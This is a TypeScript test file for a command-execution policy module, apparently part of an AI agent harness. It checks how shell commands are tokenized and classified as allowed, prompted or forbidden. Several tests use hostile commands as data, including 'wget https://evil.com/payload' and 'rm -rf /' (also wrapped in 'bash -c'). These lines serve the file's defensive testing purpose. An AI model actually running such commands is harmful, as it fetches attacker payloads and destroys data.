import { describe, it, expect, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import {
  tokenizeCommand,
  matchesRule,
  ExecPolicy,
  loadExecPolicyConfig,
  resetExecPolicy,
  getExecPolicy,
  setExecPolicy,
  deriveAmendment,
  persistAmendment,
  type PrefixRule,
  type ExecPolicyConfig,
} from "./exec-policy.js";

afterEach(() => {
  resetExecPolicy();
});

// ---------------------------------------------------------------------------
// tokenizeCommand
// ---------------------------------------------------------------------------

describe("tokenizeCommand", () => {
  it("splits simple command", () => {
    expect(tokenizeCommand("git push origin main")).toEqual([
      "git", "push", "origin", "main",
    ]);
  });

  it("handles single quotes", () => {
    expect(tokenizeCommand("echo 'hello world'")).toEqual(["echo", "hello world"]);
  });

  it("handles double quotes", () => {
    expect(tokenizeCommand('echo "hello world"')).toEqual(["echo", "hello world"]);
  });

  it("handles escaped spaces", () => {
    expect(tokenizeCommand("echo hello\\ world")).toEqual(["echo", "hello world"]);
  });

  it("handles empty string", () => {
    expect(tokenizeCommand("")).toEqual([]);
  });

  it("handles multiple spaces", () => {
    expect(tokenizeCommand("git   push   origin")).toEqual(["git", "push", "origin"]);
  });

  it("handles tabs", () => {
    expect(tokenizeCommand("git\tpush")).toEqual(["git", "push"]);
  });

  it("preserves paths with slashes", () => {
    expect(tokenizeCommand("/usr/bin/git push")).toEqual(["/usr/bin/git", "push"]);
  });

  it("handles mixed quoting", () => {
    expect(tokenizeCommand(`echo "it's" 'a "test"'`)).toEqual([
      "echo", "it's", 'a "test"',
    ]);
  });
});

// ---------------------------------------------------------------------------
// matchesRule
// ---------------------------------------------------------------------------

describe("matchesRule", () => {
  it("matches exact prefix", () => {
    const rule: PrefixRule = {
      pattern: ["git", "push"],
      decision: "prompt",
    };
    expect(matchesRule(["git", "push", "origin", "main"], rule)).toBe(true);
    expect(matchesRule(["git", "push"], rule)).toBe(true);
  });

  it("does not match shorter command", () => {
    const rule: PrefixRule = {
      pattern: ["git", "push"],
      decision: "prompt",
    };
    expect(matchesRule(["git"], rule)).toBe(false);
  });

  it("does not match different command", () => {
    const rule: PrefixRule = {
      pattern: ["git", "push"],
      decision: "prompt",
    };
    expect(matchesRule(["git", "pull"], rule)).toBe(false);
    expect(matchesRule(["svn", "push"], rule)).toBe(false);
  });

  it("matches with alternatives", () => {
    const rule: PrefixRule = {
      pattern: ["npm", ["install", "ci"]],
      decision: "allow",
    };
    expect(matchesRule(["npm", "install", "lodash"], rule)).toBe(true);
    expect(matchesRule(["npm", "ci"], rule)).toBe(true);
    expect(matchesRule(["npm", "run", "test"], rule)).toBe(false);
  });

  it("matches by basename for paths", () => {
    const rule: PrefixRule = {
      pattern: ["git", "push"],
      decision: "prompt",
    };
    expect(matchesRule(["/usr/bin/git", "push"], rule)).toBe(true);
  });

  it("rejects empty pattern", () => {
    const rule: PrefixRule = { pattern: [], decision: "allow" };
    expect(matchesRule(["anything"], rule)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// ExecPolicy
// ---------------------------------------------------------------------------

describe("ExecPolicy", () => {
  const config: ExecPolicyConfig = {
    rules: [
      { pattern: ["git", ["log", "status", "diff", "branch"]], decision: "allow" },
      { pattern: ["git", "push"], decision: "prompt", justification: "modifies remote" },
      { pattern: ["rm", "-rf"], decision: "forbidden", justification: "dangerous" },
      { pattern: ["ls"], decision: "allow" },
      { pattern: ["npm", ["install", "ci"]], decision: "allow" },
      { pattern: ["curl"], decision: "prompt" },
    ],
  };

  it("allows matching allow rules", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("git log --oneline");
    expect(result.decision).toBe("allow");
    expect(result.matchedRule?.pattern).toEqual(["git", ["log", "status", "diff", "branch"]]);
  });

  it("prompts for matching prompt rules", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("git push origin main");
    expect(result.decision).toBe("prompt");
    expect(result.justification).toBe("modifies remote");
  });

  it("forbids matching forbidden rules", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("rm -rf /");
    expect(result.decision).toBe("forbidden");
    expect(result.justification).toBe("dangerous");
  });

  it("defaults to prompt when no rules match", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("wget https://evil.com/payload");
    expect(result.decision).toBe("prompt");
    expect(result.matchedRule).toBeNull();
  });

  it("strictest decision wins when multiple rules match", () => {
    const policy = new ExecPolicy({
      rules: [
        { pattern: ["rm"], decision: "allow" },
        { pattern: ["rm", "-rf"], decision: "forbidden" },
      ],
    });
    const result = policy.evaluate("rm -rf /tmp/test");
    expect(result.decision).toBe("forbidden");
  });

  it("handles empty command", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("");
    expect(result.decision).toBe("allow");
  });

  it("unwraps bash -c commands", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate('bash -c "rm -rf /"');
    expect(result.decision).toBe("forbidden");
  });

  it("unwraps sh -c commands", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("sh -c 'git push origin main'");
    expect(result.decision).toBe("prompt");
  });

  it("handles full paths in commands", () => {
    const policy = new ExecPolicy(config);
    const result = policy.evaluate("/usr/bin/git log");
    expect(result.decision).toBe("allow");
  });

  it("reports rule count", () => {
    const policy = new ExecPolicy(config);
    expect(policy.ruleCount).toBe(6);
  });

  it("empty policy defaults to prompt", () => {
    const policy = ExecPolicy.empty();
    expect(policy.ruleCount).toBe(0);
    const result = policy.evaluate("anything");
    expect(result.decision).toBe("prompt");
  });
});

// ---------------------------------------------------------------------------
// Config loading
// ---------------------------------------------------------------------------

describe("loadExecPolicyConfig", () => {
  let tmpDir: string;

  afterEach(() => {
    if (tmpDir) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("returns empty rules when no config exists", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "execpol-"));
    const config = loadExecPolicyConfig({
      cwd: tmpDir,
      homedir: tmpDir,
      envOverrides: {},
    });
    expect(config.rules).toEqual([]);
  });

  it("loads rules from .swarm-harness/rules.json", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "execpol-"));
    const configDir = path.join(tmpDir, ".swarm-harness");
    fs.mkdirSync(configDir);
    fs.writeFileSync(
      path.join(configDir, "rules.json"),
      JSON.stringify({
        rules: [
          { pattern: ["git", "push"], decision: "prompt", justification: "remote" },
          { pattern: ["ls"], decision: "allow" },
        ],
      }),
    );

    const config = loadExecPolicyConfig({
      cwd: tmpDir,
      homedir: "/nonexistent",
      envOverrides: {},
    });
    expect(config.rules.length).toBe(2);
    expect(config.rules[0]!.decision).toBe("prompt");
    expect(config.rules[1]!.decision).toBe("allow");
  });

  it("merges rules from multiple layers", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "execpol-"));

    // Project layer
    const projectDir = path.join(tmpDir, "project", ".swarm-harness");
    fs.mkdirSync(projectDir, { recursive: true });
    fs.writeFileSync(
      path.join(projectDir, "rules.json"),
      JSON.stringify({
        rules: [{ pattern: ["npm", "install"], decision: "allow" }],
      }),
    );

    // User layer
    const homeDir = path.join(tmpDir, "home", ".swarm-harness");
    fs.mkdirSync(homeDir, { recursive: true });
    fs.writeFileSync(
      path.join(homeDir, "rules.json"),
      JSON.stringify({
        rules: [{ pattern: ["rm", "-rf"], decision: "forbidden" }],
      }),
    );

    const config = loadExecPolicyConfig({
      cwd: path.join(tmpDir, "project"),
      homedir: path.join(tmpDir, "home"),
      envOverrides: {},
    });
    expect(config.rules.length).toBe(2);
  });

  it("skips invalid rules", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "execpol-"));
    const configDir = path.join(tmpDir, ".swarm-harness");
    fs.mkdirSync(configDir);
    fs.writeFileSync(
      path.join(configDir, "rules.json"),
      JSON.stringify({
        rules: [
          { pattern: ["ls"], decision: "allow" },
          { pattern: [], decision: "allow" },
          { pattern: "not-array", decision: "allow" },
          { pattern: ["git"], decision: "invalid-decision" },
          { pattern: ["npm"], decision: "prompt" },
        ],
      }),
    );

    const config = loadExecPolicyConfig({
      cwd: tmpDir,
      homedir: "/nonexistent",
      envOverrides: {},
    });
    expect(config.rules.length).toBe(2);
  });

  it("handles malformed JSON", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "execpol-"));
    const configDir = path.join(tmpDir, ".swarm-harness");
    fs.mkdirSync(configDir);
    fs.writeFileSync(path.join(configDir, "rules.json"), "{{invalid");

    const config = loadExecPolicyConfig({
      cwd: tmpDir,
      homedir: "/nonexistent",
      envOverrides: {},
    });
    expect(config.rules).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Singleton
// ---------------------------------------------------------------------------

describe("singleton management", () => {
  it("getExecPolicy returns consistent instance", () => {
    const p1 = getExecPolicy();
    const p2 = getExecPolicy();
    expect(p1).toBe(p2);
  });

  it("setExecPolicy overrides singleton", () => {
    const custom = new ExecPolicy({
      rules: [{ pattern: ["test"], decision: "forbidden" }],
    });
    setExecPolicy(custom);
    expect(getExecPolicy()).toBe(custom);
    expect(getExecPolicy().evaluate("test").decision).toBe("forbidden");
  });

  it("resetExecPolicy clears singleton", () => {
    const p1 = getExecPolicy();
    resetExecPolicy();
    const p2 = getExecPolicy();
    expect(p1).not.toBe(p2);
  });
});

// ---------------------------------------------------------------------------
// Auto-amendment (E2)
// ---------------------------------------------------------------------------

describe("deriveAmendment", () => {
  it("derives a prefix rule from a command", () => {
    const amendment = deriveAmendment("git push origin main");
    expect(amendment).not.toBeNull();
    expect(amendment!.rule.pattern).toEqual(["git", "push", "origin"]);
    expect(amendment!.rule.decision).toBe("allow");
  });

  it("limits prefix to 3 tokens", () => {
    const amendment = deriveAmendment("npm run test -- --verbose --coverage");
    expect(amendment!.rule.pattern).toEqual(["npm", "run", "test"]);
  });

  it("handles short commands", () => {
    const amendment = deriveAmendment("ls");
    expect(amendment!.rule.pattern).toEqual(["ls"]);
  });

  it("unwraps shell -c before deriving", () => {
    const amendment = deriveAmendment('bash -c "git push origin"');
    expect(amendment!.rule.pattern).toEqual(["git", "push", "origin"]);
  });

  it("returns null for empty command", () => {
    expect(deriveAmendment("")).toBeNull();
  });
});

describe("persistAmendment", () => {
  let tmpDir: string;

  afterEach(() => {
    if (tmpDir) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("creates rules.json if it doesn't exist", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "amend-"));
    const amendment = deriveAmendment("git push origin main")!;
    persistAmendment(amendment, { homedir: tmpDir });

    const filePath = path.join(tmpDir, ".swarm-harness", "rules.json");
    expect(fs.existsSync(filePath)).toBe(true);

    const content = JSON.parse(fs.readFileSync(filePath, "utf8"));
    expect(content.rules.length).toBe(1);
    expect(content.rules[0].pattern).toEqual(["git", "push", "origin"]);
  });

  it("appends to existing rules", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "amend-"));
    const dir = path.join(tmpDir, ".swarm-harness");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, "rules.json"),
      JSON.stringify({ rules: [{ pattern: ["ls"], decision: "allow" }] }),
    );

    const amendment = deriveAmendment("git push origin main")!;
    persistAmendment(amendment, { homedir: tmpDir });

    const content = JSON.parse(
      fs.readFileSync(path.join(dir, "rules.json"), "utf8"),
    );
    expect(content.rules.length).toBe(2);
  });

  it("skips duplicate rules", () => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "amend-"));
    const amendment = deriveAmendment("git push origin")!;
    persistAmendment(amendment, { homedir: tmpDir });
    persistAmendment(amendment, { homedir: tmpDir });

    const filePath = path.join(tmpDir, ".swarm-harness", "rules.json");
    const content = JSON.parse(fs.readFileSync(filePath, "utf8"));
    expect(content.rules.length).toBe(1);
  });
});
